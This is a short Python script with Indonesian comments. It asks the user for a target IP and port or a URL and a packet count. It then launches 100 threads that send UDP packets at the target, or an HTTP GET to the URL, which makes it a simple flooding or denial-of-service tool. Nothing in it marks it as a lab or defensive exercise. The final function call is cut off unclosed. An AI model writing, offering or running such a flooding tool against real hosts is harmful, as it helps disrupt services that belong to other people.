import socket
import threading
import requests

# Input dari pengguna
target_type = input("Masukkan tipe target (IP atau URL): ")
if target_type.lower() == "ip":
    target_ip = input("Masukkan IP target: ")
    target_port = int(input("Masukkan port target: "))
    packet_count = int(input("Masukkan jumlah paket: "))
    url = None
elif target_type.lower() == "url":
    url = input("Masukkan URL target: ")
    target_ip = None
    target_port = None
    packet_count = int(input("Masukkan jumlah paket: "))
else:
    print("Tipe target tidak valid. Silakan pilih 'IP' atau 'URL'.")
    exit()

# Fungsi untuk mengirim paket
def send_packet():
    if target_ip:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(packet_count):
            sock.sendto(b"Hello, World!", (target_ip, target_port))
        sock.close()
    else:
        response = requests.get(url)
        print(f"Status code: {response.status_code}")

# Fungsi untuk menjalankan pengiriman paket secara paralel
def run_parallel():
    threads = []
    for _ in range(100):
        t = threading.Thread(target=send_packet)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# Jalankan pengiriman paket secara paralel
run_parallel(
